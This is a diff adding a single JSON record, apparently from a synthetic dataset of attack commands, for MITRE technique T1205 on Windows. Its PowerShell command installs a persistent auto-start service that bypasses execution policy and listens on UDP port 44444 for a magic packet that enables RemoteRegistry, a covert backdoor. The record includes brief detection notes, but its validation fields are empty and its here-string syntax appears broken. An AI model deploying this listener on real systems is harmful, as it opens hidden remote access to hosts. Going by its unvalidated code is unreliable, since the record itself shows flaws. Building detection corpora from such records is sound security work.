@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $script = @'$udp = New-Object System.Net.Sockets.UdpClient(44444)\n$ep = New-Object System.Net.IPEndPoint([IPAddress]::Any,0)\n$data = $udp.Receive([ref]$ep)\n$msg = [Text.Encoding]::ASCII.GetString($data)\nif($msg -eq ''START:RemoteRegistry''){ Set-Service -Name ''RemoteRegistry'' -StartupType Automatic; Start-Service -Name ''RemoteRegistry'' }\n$udp.Close()\n'@; $path='C:\\ProgramData\\knock-listener.ps1'; Set-Content -Path $path -Value $script -Encoding ASCII; New-Service -Name 'KnockListener' -BinaryPathName \"powershell.exe -ExecutionPolicy Bypass -File `\"$path`\"\" -StartupType Automatic -Description 'Listens for UDP magic packet to enable service'; Start-Service -Name 'KnockListener' }",
+  "explanation": "Creates and starts a Windows service that listens for a UDP magic string 'START:RemoteRegistry' to enable and start the RemoteRegistry service, exemplifying traffic signaling to activate functionality. Detection: alert on creation of new services that run PowerShell, UDP bindings on high ports, and unexpected changes to RemoteRegistry startup type. Requires Administrator privileges; UAC elevation required for New-Service.",
+  "rationale_steps": [
+    "Deploy a persistent knock listener via New-Service.",
+    "On receiving a magic packet, enable and start a disabled service.",
+    "Provide detections for new services and service configuration changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-1108f921-b8e603f0",
+  "source_prompt_hash": "1108f921",
+  "timestamp_utc": "2025-09-30T05:58:00.779201Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
